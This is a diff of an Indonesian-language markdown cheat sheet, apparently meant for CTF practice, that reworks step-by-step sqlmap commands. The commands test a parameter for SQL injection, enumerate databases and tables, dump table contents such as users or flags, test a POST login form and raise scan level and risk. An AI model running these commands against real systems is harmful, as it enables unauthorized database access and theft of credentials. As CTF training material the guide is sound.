@@ -8,33 +8,54 @@ sudo apt install -y sqlmap
 
 ## Empat Tangga
 
-Tangga 1, tes param rawan:
-
 ```bash
 sqlmap -u "http://target/index.php?id=1" --batch
 ```
 
-Tangga 2, daftar database:
+Tes param rawan, kalau output ada "is vulnerable" lanjut.
 
 ```bash
 sqlmap -u "http://target/index.php?id=1" --batch --dbs
 ```
 
-Tangga 3, pilih database, daftar tabel:
+Daftar database, ganti nama_db dengan hasilnya di tangga berikut.
 
 ```bash
 sqlmap -u "http://target/index.php?id=1" --batch -D nama_db --tables
 ```
 
-Tangga 4, pilih tabel, dump isinya:
+Daftar tabel, tabel yang menarik di CTF: users, flag, admin.
 
 ```bash
 sqlmap -u "http://target/index.php?id=1" --batch -D nama_db -T nama_tabel --dump
 ```
 
-## Target POST Pakai Request File
+Dump isi tabel, flag biasanya di sini.
 
-Save request dari Burp ke file, terus:
+## POST Langsung
+
+```bash
+sqlmap -u "http://target/login.php" --data "username=admin&password=test" --batch
+```
+
+## Tes Lebih Dalam
+
+```bash
+sqlmap -u "http://target/index.php?id=1" --batch --level 3 --risk 2
+```
+
+Buat param yang gak kedetek di level default.
+
+## Keterangan Opsi
+
+-u      URL target
+--data  body POST langsung
+--batch jawab semua prompt otomatis
+--dbs   daftar database
+-D      pilih database
+--tables daftar tabel
+-T      pilih tabel
+--dump  dump isi tabel
 
 ```bash
 sqlmap -r request.txt --batch
